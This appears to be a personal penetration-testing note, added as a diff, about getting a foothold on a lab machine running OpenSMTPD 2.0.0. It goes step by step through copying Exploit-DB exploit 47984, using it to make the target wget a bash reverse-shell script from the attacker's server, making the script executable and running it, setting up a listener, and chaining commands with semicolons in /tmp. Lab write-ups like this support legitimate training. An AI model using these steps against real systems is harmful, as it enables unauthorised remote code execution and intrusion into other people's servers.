@@ -1,0 +1,30 @@
+if after running an nmap scan and you see smtp is open check the version. If it looks like this you might be able to get a foothold:
+
+25/tcp  open   smtp        OpenSMTPD
+| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.218], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
+|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
+
+
+1.) searchsploit smtp
+2.) /usr/share/exploitdb/exploits/linux/remote/47984.py pops up as an rce
+3.) searchsploit -m /linux/remote/47984.py
+	- -m mirrors the exploit and copies it into your current working directory
+4.) start a python server and put a bashshell.sh file onto the server with the following command
+5.) python3 smtpdrce.py 192.168.218.71 25 'wget myip/bashshell.sh'
+6.) see if the python server got a get request
+7.) if it did make sure to change the privs on this with the smtpdrce.py using 'chmod +x bashshell.sh'
+8.) from there trying running it with './bashshell.sh' (these commands get entered after 25 in the rce.py)
+9.) setup your listener on the port specified in the bashshell script before running actually
+10.) run it again and you should gey a shell!!!
+
+if this doesnt work but you got a get request from the python server you can try doing stacked remote command execution
+
+to do this add a ; in between commmands.
+
+e.g: python3 smtpdrce.py 192.168.218.71 25 'cd /tmp; wget myip/bashshell.sh'
+
+the tmp directory might allow you to upload files with the user you are running the rce as
+
+then do the same for the other commands and just add the cd /tmp; before them 
+
+hopefully that works
